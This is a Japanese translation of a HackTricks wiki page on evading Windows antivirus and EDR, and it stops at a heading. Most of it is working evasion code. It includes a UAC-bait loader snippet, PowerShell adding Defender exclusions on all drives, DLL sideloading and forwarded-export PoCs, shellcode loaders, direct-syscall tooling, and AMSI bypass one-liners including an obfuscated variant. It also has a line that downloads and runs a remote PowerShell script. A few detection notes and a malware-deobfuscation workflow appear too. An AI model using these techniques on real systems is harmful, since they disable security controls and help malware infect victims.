# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは当初、** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって執筆されました！**

## Defenderを停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを偽装してWindows Defenderの動作を停止するツール。
- [管理者権限がある場合にDefenderを無効化する](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前にInstaller-style UAC baitを使用する

ゲームチートを装ったPublic loaderは、署名のないNode.js/Nexe installerとして配布されることが多く、最初に**ユーザーに昇格を要求**し、その後でDefenderを無力化します。流れは単純です。

1. `net session`で管理者コンテキストを確認します。このコマンドは呼び出し元が管理者権限を持っている場合にのみ成功するため、失敗した場合はloaderが標準ユーザーとして実行されていることを示します。
2. 元のコマンドラインを維持したまま、`RunAs` verbを使用して自身を直ちに再起動し、想定されるUACの同意プロンプトを表示します。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに「cracked」ソフトウェアをインストールしていると考えているため、通常このプロンプトを受け入れ、malwareにDefenderのポリシーを変更するために必要な権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブレターに対する包括的な `MpPreference` 除外

権限昇格後、GachiLoader-styleのチェーンはサービスを完全に無効化するのではなく、Defenderの死角を最大化します。loaderはまずGUI watchdog（`taskkill /F /IM SecHealthUI.exe`）を終了させ、続いて**極めて広範な除外設定**を適用します。これにより、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクがスキャン不能になります。
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
主な観察事項:

- このループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこかに配置された payload はすべて無視されます**。
- `.sys` 拡張子の除外は将来を見据えたもので、攻撃者は後から Defender に再度触れることなく、署名されていないドライバーをロードする選択肢を確保できます。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 配下に反映されるため、後続ステージでは、UAC を再度トリガーせずに除外設定が維持されていることを確認したり、除外対象を拡張したりできます。

Defender サービスは停止されないため、単純なヘルスチェックでは「antivirus active」と報告され続けますが、実際のリアルタイム検査がそれらのパスに到達することはありません。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

現在、AV はファイルが malicious かどうかを確認するために、静的検出、動的分析、さらに高度な EDR では振る舞い分析など、さまざまな手法を使用しています。

### **静的検出**

静的検出は、binary や script 内に存在する既知の malicious な文字列やバイト配列を検出したり、ファイル自体から情報（ファイルの説明、会社名、デジタル署名、アイコン、checksum など）を抽出したりすることで実現されます。つまり、既知の公開ツールを使用すると、すでに分析されて malicious としてフラグ付けされている可能性が高いため、より簡単に検出されることがあります。この種の検出を回避する方法はいくつかあります。

- **Encryption**

binary を暗号化すれば、AV がプログラムを検出する方法はなくなりますが、プログラムを復号して memory 上で実行するための何らかの loader が必要になります。

- **Obfuscation**

場合によっては、binary や script 内の文字列をいくつか変更するだけで AV を通過できますが、何を obfuscate しようとしているかによっては、時間のかかる作業になることがあります。

- **Custom tooling**

独自のツールを開発すれば、既知の悪性シグネチャは存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defender の静的検出を確認する方法として、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を強く推奨します。これは基本的にファイルを複数のセグメントに分割し、それぞれを個別に Defender にスキャンさせます。これにより、binary 内のどの文字列やバイトがフラグ付けされたのかを正確に確認できます。

実践的な AV Evasion については、この [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) を確認することを強く推奨します。

### **動的分析**

動的分析とは、AV が sandbox 内で binary を実行し、malicious な活動（ブラウザーのパスワードを復号して読み取ろうとする、LSASS に対して minidump を実行するなど）を監視することです。この部分への対策は少し難しくなりますが、sandbox を回避するためにできることをいくつか紹介します。

- **実行前に Sleep する** 実装方法によっては、AV の動的分析を回避する優れた方法になります。AV がファイルをスキャンできる時間は、ユーザーのワークフローを中断しないよう非常に短く設定されています。そのため、長い sleep を使用すると binary の分析を妨害できます。ただし、多くの AV sandbox は、実装方法によっては sleep をスキップできます。
- **マシンのリソースを確認する** 通常、Sandbox が使用できるリソースは非常に少なく設定されています（例: < 2GB RAM）。そうでなければユーザーのマシンの動作が遅くなる可能性があるためです。ここでは非常に創造的な方法も使えます。例えば CPU の温度やファンの回転速度を確認する方法です。Sandbox 内ですべてが実装されているとは限りません。
- **マシン固有のチェック** ワークステーションが `"contoso.local"` ドメインに参加しているユーザーを標的にしたい場合、コンピューターのドメインを確認し、指定したものと一致するかを判定できます。一致しなければ、プログラムを終了させます。

Microsoft Defender の Sandbox computername は HAL9TH であることが判明しています。そのため、detonation 前に malware 内でコンピューター名を確認できます。名前が HAL9TH と一致する場合、Defender の sandbox 内にいることを意味するため、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox に対抗するための、[@mgeeky](https://twitter.com/mariuszbit) によるその他の優れたヒント

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この投稿で前述したように、**public tools** は最終的に**検出される**ため、自分自身に次のことを問いかけるべきです。

例えば、LSASS を dump したい場合、**本当に mimikatz を使う必要がありますか**。それとも、あまり知られておらず、LSASS も dump できる別の project を使えるでしょうか。

おそらく後者が正解です。mimikatz を例にすると、AV や EDR に最も多くフラグ付けされている malware の一つ、あるいはその筆頭でしょう。project 自体は非常に優れていますが、AV を回避するために扱うのは悪夢のように難しいため、達成したい目的に対する alternative を探してください。

> [!TIP]
> 回避のために payload を変更する場合は、Defender の **automatic sample submission を無効にする**ようにしてください。そして、長期的に回避を達成することが目的なら、**絶対に VIRUSTOTAL にアップロードしないでください**。特定の AV で payload が検出されるか確認したい場合は、その AV を VM にインストールし、automatic sample submission を無効にしてから、結果に納得できるまでそこでテストしてください。

## EXEs vs DLLs

可能な場合は常に、回避のために **DLL の使用を優先してください**。私の経験では、DLL ファイルは通常、検出や分析の対象になることが**はるかに少ない**ため、payload を DLL として実行する方法がある場合には、検出を回避するための非常に簡単な手法になります。

この画像からわかるように、Havoc の DLL Payload は antiscan.me で 4/26 の検出率である一方、EXE payload の検出率は 7/26 です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常の Havoc EXE payload と通常の Havoc DLL の antiscan.me による比較</p></figcaption></figure>

ここからは、DLL ファイルを使ってさらに stealthy にするための tricks をいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、victim application と malicious payload(s) を隣り合わせに配置することで、loader が使用する DLL search order を利用します。

[ Siofra](https://github.com/Cybereason/siofra) と次の powershell script を使用すると、DLL Sideloading の影響を受けやすいプログラムを確認できます。
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、`"C:\Program Files\\"` 内で DLL hijacking の影響を受けやすいプログラムの一覧と、それらが読み込もうとする DLL ファイルを出力します。

**DLL Hijackable/Sideloadable programs** は、自分で調査することを強くおすすめします。この technique は適切に実行すれば非常に stealthy ですが、publicly known な DLL Sideloadable programs を使用すると、簡単に検知される可能性があります。

プログラムが読み込もうとする名前の malicious DLL を配置するだけでは、payload は読み込まれません。プログラムはその DLL 内に特定の functions が存在することを想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使用します。

**DLL Proxying** は、プログラムが proxy（および malicious）DLL に対して行う calls を original DLL に転送します。これにより、プログラムの機能を維持しながら、payload の execution を処理できます。

ここでは [@flangvik](https://twitter.com/Flangvik) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下が実行した手順です。
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドにより、2つのファイルが生成されます。DLL source code templateと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
結果は以下のとおりです：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[SGN](https://github.com/EgeBalci/sgn) でエンコードした shellcode と proxy DLL の両方が、[antiscan.me](https://antiscan.me) で 0/26 Detection rate でした！これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading についての [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) と、さらに詳しく学ぶために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を **強く推奨** します。

### Forwarded Exports の悪用 (ForwardSideLoading)

Windows PE modules は、実際には "forwarders" である functions を export できます。code を指す代わりに、export entry には `TargetDll.TargetFunc` 形式の ASCII string が含まれます。caller が export を resolve すると、Windows loader は以下を実行します：

- まだ load されていない場合は `TargetDll` を load する
- そこから `TargetFunc` を resolve する

理解しておくべき主な動作：
- `TargetDll` が KnownDLL の場合、protected KnownDLLs namespace (例：ntdll、kernelbase、ole32) から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll` が KnownDLL でない場合は、通常の DLL search order が使用されます。これには forward resolution を実行している module の directory も含まれます。

これにより、間接的な sideloading primitive が可能になります。つまり、non-KnownDLL module name に forward された function を export している signed DLL を見つけ、その signed DLL を、forward された target module と完全に同じ名前の attacker-controlled DLL と同じ directory に配置します。forwarded export が invoke されると、loader は forward を resolve し、同じ directory からあなたの DLL を load して DllMain を実行します。<sup>[[13]](#references)</sup>

Windows 11 で確認された例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（copy-paste）:
1) 署名済みの system DLL を書き込み可能なフォルダーにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。最小限の DllMain で code execution を実行するには十分であり、DllMain をトリガーするために forwarded function を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名付きLOLBinでforwardをトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
観察された挙動:
- rundll32 (signed) は side-by-side の `keyiso.dll` (signed) をロードする
- `KeyIsoSetAuditingInterface` の解決中に、loader は `NCRYPTPROV.SetAuditingInterface` への forward をたどる
- その後、loader は `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` がすでに実行された後にのみ "missing API" エラーが発生する

Hunting のヒント:
- target module が KnownDLL ではない forwarded exports に注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に一覧表示されている
- 次のような tooling を使用して forwarded exports を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 forwarder inventory を参照してください: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検出/防御のアイデア:
- LOLBins（例: rundll32.exe）が非システムパスから署名済み DLL を読み込み、その後、そのディレクトリから同じベース名を持つ非 KnownDLLs を読み込む動作を監視する
- `rundll32.exe` → 非システムの `keyiso.dll` → ユーザーが書き込み可能なパス配下の `NCRYPTPROV.dll` のようなプロセス/モジュールチェーンを検知する
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの write+execute を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は、suspended processes、direct syscalls、alternative execution methods を使用して EDRs をバイパスするための payload toolkit です`

Freeze を使用すると、ステルス性の高い方法で shellcode をロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion は単なる cat & mouse game です。今日有効な方法が明日には検出される可能性があるため、1つのツールだけに依存しないでください。可能であれば、複数の Evasion techniques を連鎖させてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR は多くの場合、`ntdll.dll` の syscall stubs に **user-mode inline hooks** を配置します。これらの hooks を bypass するには、正しい **SSN** (System Service Number) をロードし、hook された export entrypoint を実行せずに kernel mode へ transition する **direct** または **indirect** syscall stubs を生成できます。<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: 生成された stub に `syscall`/`sysenter`/`SVC #0` instruction を埋め込みます（`ntdll` export には到達しません）。
- **Indirect**: `ntdll` 内にある既存の `syscall` gadget へ jump し、kernel transition が `ntdll` から発生したように見せます（heuristic evasion に有用）。**randomized indirect** では、call ごとに pool から gadget を選択します。
- **Egg-hunt**: static な `0F 05` opcode sequence を disk 上に埋め込むことを避け、runtime に syscall sequence を resolve します。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes を読み取る代わりに、syscall stubs を virtual address で sort して SSN を推測します。
- **SyscallsFromDisk**: clean な `\KnownDlls\ntdll.dll` を map し、その `.text` から SSN を読み取ってから unmap します（メモリ上のすべての hooks を bypass します）。
- **RecycledGate**: VA-sorted SSN inference と、stub が clean な場合の opcode validation を組み合わせます。hook されている場合は VA inference に fallback します。
- **HW Breakpoint**: `syscall` instruction に DR0 を設定し、VEH を使用して runtime に `EAX` から SSN を取得します。hook された bytes の parsing は不要です。

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作成されました。当初、AVは**ディスク上のファイル**のみをスキャンできたため、何らかの方法でpayloadを**メモリ上で直接**実行できれば、AVにはそれを防ぐための十分な可視性がなく、何もできませんでした。

AMSI機能は、以下のWindowsコンポーネントに統合されています。

- User Account Control、またはUAC（EXE、COM、MSI、ActiveXのインストール時の昇格）
- PowerShell（script、対話的な使用、dynamic code evaluation）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBA macros

これにより、antivirus solutionは、scriptの内容を暗号化も難読化もされていない形式で公開することで、scriptの動作を検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで以下のalertが発生します。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続いて、そのscriptを実行したexecutableへのpathが付加されていることに注目してください。この場合はpowershell.exeです。

ディスクにファイルをdropしていませんが、それでもAMSIによってメモリ上で検知されました。

さらに、**.NET 4.8**以降では、C# codeもAMSIを通過します。これは、メモリ上で実行するための`Assembly.Load(byte[])`によるloadにも影響します。そのため、AMSIを回避してメモリ上で実行したい場合は、.NETの低いversion（4.7.2以下など）を使用することが推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主にstatic detectionで動作するため、loadしようとするscriptを変更することは、detectionを回避する有効な方法になります。

しかし、AMSIには複数のlayerがある場合でもscriptの難読化を解除する機能があるため、obfuscationの実装方法によっては、悪い選択肢になる可能性があります。このため、回避はそれほど単純ではありません。ただし、場合によっては、いくつかのvariable名を変更するだけで十分なこともあるため、どの程度flagが立てられているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（およびcscript.exe、wscript.exeなど）のprocessにloadすることで実装されているため、unprivileged userとして実行していても簡単にtamperできます。AMSIの実装にこのflawがあるため、researcherたちはAMSI scanningを回避する複数の方法を発見しています。

**Forcing an Error**

AMSIのinitializationを強制的に失敗させる（amsiInitFailed）と、現在のprocessではscanが開始されなくなります。この手法はもともと[Matt Graeber](https://twitter.com/mattifestation)によって公開され、Microsoftは広範な利用を防ぐためのsignatureを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在のPowerShellプロセスでAMSIを使用不能にするのに必要だったのは、PowerShellコード1行だけでした。もちろん、この行自体がAMSIによって検知されるため、この technique を使用するには何らかの変更が必要です。

以下は、この [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取得した、変更済みのAMSI bypassです。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
この投稿が公開されると、おそらくフラグが立つため、検知されないことが計画の目的なら、コードを公開すべきではありません。

**Memory Patching**

この technique は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。これは、amsi.dll 内の "AmsiScanBuffer" function（ユーザーが入力した内容のスキャンを担当）の address を見つけ、E_INVALIDARG の code を返す instructions で上書きするものです。これにより、実際の scan の結果は 0 を返すようになり、clean result として解釈されます。

> [!TIP]
> より詳しい説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) を読んでください。

AMSI を powershell で bypass するために使用される他の technique も数多くあります。詳細については、[**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を確認してください。

### amsi.dll の load を阻止して AMSI を block する（LdrLoadDll hook）

AMSI は、amsi.dll が current process に load された後にのみ initialised されます。堅牢で language-agnostic な bypass 方法は、`ntdll!LdrLoadDll` に user-mode hook を配置し、要求された module が `amsi.dll` の場合に error を返すことです。その結果、AMSI は load されず、その process では scan が発生しません。<sup>[[23]](#references)</sup>

Implementation outline（x64 C/C++ pseudocode）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell、WScript/CScript、custom loaders のいずれでも動作します（それ以外の場合に AMSI をロードするものすべて）。
- stdin 経由で script を渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせることで、長い command-line artefacts を回避できます。
- LOLBins 経由で実行される loaders で使用されている例があります（例：`regsvr32` が `DllRegisterServer` を呼び出す場合）。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** ツールも AMSI を bypass する script を生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** ツールも、randomized user-defined function、variables、characters expression を使用し、PowerShell keywords の character casing をランダムに適用して signature を回避する AMSI bypass 用 script を生成します。

**検出された signature を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などの tool を使用して、現在の process の memory から検出された AMSI signature を削除できます。この tool は、現在の process の memory をスキャンして AMSI signature を探し、NOP instructions で上書きすることで動作し、実質的に memory から signature を削除します。

**AMSI を使用する AV/EDR products**

AMSI を使用する AV/EDR products の一覧は、**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell version 2 を使用する**
PowerShell version 2 を使用すると AMSI はロードされないため、AMSI にスキャンされずに script を実行できます。次のように実行できます：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging は、システム上で実行されたすべての PowerShell コマンドを記録できる機能です。これは監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題**にもなります。

PowerShell logging を bypass するには、以下の techniques を使用できます。

- **PowerShell Transcription と Module Logging を無効化する**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のような tool を使用できます。
- **Powershell version 2 を使用する**: PowerShell version 2 を使用すると AMSI が load されないため、AMSI に scan されずに scripts を実行できます。次のように実行します: `powershell.exe -version 2`
- **unmanaged PowerShell session を使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用して、`powershell.exe` を起動せずに PowerShell を host します（Cobalt Strike の `powerpick` で使用される approach）。これにより、`powershell.exe` process に特化した controls は回避できますが、AMSI、Script Block Logging、その他すべての PowerShell defense が自動的に無効になるわけではありません。coverage は runtime と host implementation に依存します。


## Obfuscation

> [!TIP]
> 複数の obfuscation techniques は data の encrypting に依存しており、binary の entropy が増加するため、AV や EDR による検知が容易になります。この点に注意し、暗号化は code の中でも機密性がある、または隠す必要がある特定の sections にのみ適用することを検討してください。

### ConfuserEx-Protected .NET Binaries の Deobfuscating

ConfuserEx 2（または commercial forks）を使用する malware を analysing する場合、decompilers や sandboxes を妨害する複数の protection layers に遭遇することが一般的です。以下の workflow により、後から dnSpy や ILSpy などの tools で C# に decompile できる、ほぼ original の **IL を確実に restore** できます。<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx はすべての *method body* を encrypt し、*module* の static constructor（`<Module>.cctor`）内で decrypt します。また PE checksum に patch を適用するため、変更を加えると binary が crash します。**AntiTamperKiller** を使用して、encrypted metadata tables を locate し、XOR keys を recover して、clean assembly に rewrite します。
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output には 6 つの anti-tamper parameters（`key0-key3`、`nameHash`、`internKey`）が含まれており、独自の unpacker を構築する際に役立ちます。

2.  Symbol / control-flow recovery – *clean* file を **de4dot-cex**（ConfuserEx に対応した de4dot の fork）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile を select します
• de4dot は control-flow flattening を undo し、original namespaces、classes、variable names を restore して、constant strings を decrypt します。

3.  Proxy-call stripping – ConfuserEx は、decompilation をさらに妨害するため、direct method calls を軽量な wrappers（別名 *proxy calls*）に置き換えます。**ProxyCall-Remover** でこれらを remove します。
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
この step の後は、不透明な wrapper functions（`Class8.smethod_10` など）ではなく、`Convert.FromBase64String` や `AES.Create()` などの通常の .NET API が確認できるはずです。

4.  Manual clean-up – resulting binary を dnSpy で実行し、large Base64 blobs または `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を search して、*real* payload を locate します。malware は多くの場合、`<Module>.byte_0` 内で initialised された TLV-encoded byte array として payload を保存します。

上記の chain により、malicious sample を実行せずに execution flow を restore できます。これは offline workstation で作業する際に役立ちます。

> 🛈  ConfuserEx は `ConfusedByAttribute` という custom attribute を生成します。これは sample を自動的に triage するための IOC として使用できます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアセキュリティを強化できる、[LLVM](http://www.llvm.org/) compilation suiteのオープンソースフォークを提供することです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使用せず、compilerを変更することもなく、`C++11/14` languageを使用してcompile時にobfuscated codeを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkによって生成されたobfuscated operationsのlayerを追加し、applicationをcrackしようとする人の作業を少し困難にします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなpe filesをobfuscateできるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意のexecutables向けのシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP (return-oriented programming)を使用するLLVM-supported languages向けのfine-grained code obfuscation frameworkです。ROPfuscatorは、通常のinstructionsをROP chainsに変換することでassembly code levelでprogramをobfuscateし、通常のcontrol flowに対する自然な認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをshellcodeに変換し、それをloadできます。

### LLVM compiler-assisted per-function self-masking

implant全体をsleep中だけmaskする代わりに、変更されたLLVM X86 backendは、選択したfunctionsがinactiveの間、XOR-masked状態を維持できます。Function Peekaboo PoCは、`REG_`を含むdemangled namesを選択し、最終的なmachine codeの前後にposition-independent entry/exit stubsを挿入し、`.text`に1つのshared masking handlerを出力します。source-level signaturesとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

この処理はinstruction selectionとoptimizationの後に行う必要があります。これは、**すべての生成されたreturn**を対象にし、正確なx86 layoutを把握する必要があるためです。emission前の`MachineFunctionPass`は最後の`MachineInstr::isReturn()`を見つけ、それを削除して最終pathが追加されたepilogueへfall throughするようにし、それより前のreturnsを`JMP_1 handler`に置き換えます。各returnの前にあるcompiler-generated stack/frame teardownは維持し、return instruction自体だけをredirectします。<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()`と`X86AsmPrinter::emitFunctionBodyEnd()`はper-function stubsを出力し、`emitEndOfAsmFile()`はhandlerを出力します。emission stages間でsharedされるsymbolsにより、prologue branchは後続のepilogueをtargetにできます。手動でnear `je`をemissionする場合は、`0F 84`に続けて、4-byte MC expression `target - address_after_je`を書き込みます。handlerへのcallsとjumpsは、代わりに`MCInst` objects (`CALL64pcrel32`と`JMP_1`)としてemissionできます。passは、何も変更していないunselected functionに対して`false`を返す必要がありますが、PoCはそのpathで誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

